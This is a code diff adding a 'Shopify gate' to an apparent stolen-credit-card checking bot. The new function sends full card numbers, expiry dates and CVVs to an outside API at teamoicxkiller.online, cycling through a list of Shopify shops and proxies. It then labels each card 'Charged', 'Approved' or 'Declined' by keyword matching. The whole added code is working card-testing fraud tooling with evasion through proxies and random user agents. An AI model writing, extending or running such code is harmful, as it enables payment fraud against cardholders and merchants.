@@ -1114,6 +1114,130 @@ def check_cc_auth2(cc_number, month, year, cvv, proxies=None):
 
     return f"⚠️ Auth2 API Down | All endpoints unreachable ({round(time.time() - start_time, 2)}s)"
 
+# ============================================================
+#  Shopify gate — uses teamoicxkiller.online API + sites.txt
+# ============================================================
+SHOPIFY_DEAD_INDICATORS = [
+    'receipt id is empty', 'handle is empty', 'product id is empty',
+    'tax amount is empty', 'payment method identifier is empty',
+    'invalid url', 'error in 1st req', 'error in 1 req',
+    'cloudflare', 'connection failed', 'timed out',
+    'access denied', 'tlsv1 alert', 'ssl routines',
+    'could not resolve', 'domain name not found',
+    'name or service not known', 'openssl ssl_connect',
+    'empty reply from server', 'httperror504', 'http error',
+    'timeout', 'unreachable', 'ssl error',
+    '502', '503', '504', 'bad gateway', 'service unavailable',
+    'gateway timeout', 'network error', 'connection reset',
+    'failed to detect product', 'failed to create checkout',
+    'failed to tokenize card', 'failed to get proposal data',
+    'submit rejected', 'handle error', 'http 404',
+    'url rejected', 'malformed input', 'amount_too_small',
+    'captcha_required', 'captcha required', 'site dead', 'failed'
+]
+
+SHOPIFY_APPROVED_KW = [
+    'invalid_cvv', 'incorrect_cvv', 'insufficient_funds', 'approved',
+    'success', 'invalid_cvc', 'incorrect_cvc', 'incorrect_zip',
+    'insufficient funds'
+]
+
+
+def load_shopify_sites():
+    """Load sites from sites.txt in same folder as bot."""
+    if not os.path.exists(SITES_FILE):
+        return []
+    with open(SITES_FILE, 'r') as f:
+        return [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
+
+
+def check_cc_shopify(cc_number, month, year, cvv, proxies=None):
+    """Shopify gate — checks card via Shopify API using random site from sites.txt."""
+    start_time = time.time()
+    cc_data = f"{cc_number}|{month}|{year}|{cvv}"
+
+    sites = load_shopify_sites()
+    if not sites:
+        return "⚠️ No sites in sites.txt | Admin needs to add Shopify sites"
+
+    # Try up to 3 sites
+    last_error = "All sites failed"
+    for attempt in range(min(3, len(sites))):
+        site = random.choice(sites)
+        if not site.startswith('http'):
+            site = f'https://{site}'
+
+        try:
+            # Build proxy string for the API
+            proxy_str = ""
+            if proxies:
+                for scheme in ("https", "http", "socks5", "socks4"):
+                    if scheme in proxies:
+                        raw = proxies[scheme].replace("http://", "").replace("https://", "").replace("socks5://", "").replace("socks4://", "")
+                        proxy_str = raw
+                        break
+
+            url = f'https://teamoicxkiller.online/code/index.php?cc={cc_data}&url={site}'
+            if proxy_str:
+                url += f'&proxy={proxy_str}'
+
+            resp = requests.get(url, headers={'User-Agent': _rand_ua()}, timeout=100)
+            process_time = round(time.time() - start_time, 2)
+
+            if resp.status_code != 200:
+                last_error = f"API HTTP {resp.status_code}"
+                continue
+
+            try:
+                rj = resp.json()
+            except Exception:
+                last_error = f"Invalid JSON: {resp.text[:60]}"
+                continue
+
+            api_response = rj.get('Response', '')
+            price = rj.get('Price', '-')
+            if price != '-':
+                price = f"${price}"
+            gateway = rj.get('Gate', 'Shopify')
+            resp_lower = api_response.lower()
+
+            # Check for dead site
+            if any(ind in resp_lower for ind in SHOPIFY_DEAD_INDICATORS):
+                last_error = f"Site dead: {api_response[:60]}"
+                continue  # Try next site
+
+            # Check for 3DS
+            if '3d' in resp_lower:
+                return f"Declined | 3DS Required | {gateway} | {price} ({process_time}s)"
+
+            # Check for charged
+            if 'order completed' in resp_lower or '💎' in api_response or 'thank you' in resp_lower or 'payment successful' in resp_lower:
+                return f"Charged 💎 | {api_response[:80]} | {gateway} | {price} ({process_time}s)"
+
+            # Check for approved
+            if any(kw in resp_lower for kw in SHOPIFY_APPROVED_KW):
+                return f"Approved | {api_response[:80]} | {gateway} | {price} ({process_time}s)"
+
+            # Cloudflare
+            if 'cloudflare' in resp_lower:
+                last_error = "Cloudflare blocked"
+                continue
+
+            # Default — declined
+            return f"Declined | {api_response[:80]} | {gateway} | {price} ({process_time}s)"
+
+        except requests.exceptions.Timeout:
+            last_error = "API timeout"
+            continue
+        except requests.exceptions.ConnectionError:
+            last_error = "API unreachable"
+            continue
+        except Exception as e:
+            return f"Error: {str(e)}"
+
+    process_time = round(time.time() - start_time, 2)
+    return f"⚠️ Shopify Failed | {last_error} ({process_time}s)"
+
 
 def process_single_entry(entry, proxies_list, user_id, gate="auth"):
     raw_proxy = random.choice(proxies_list) if proxies_list else None
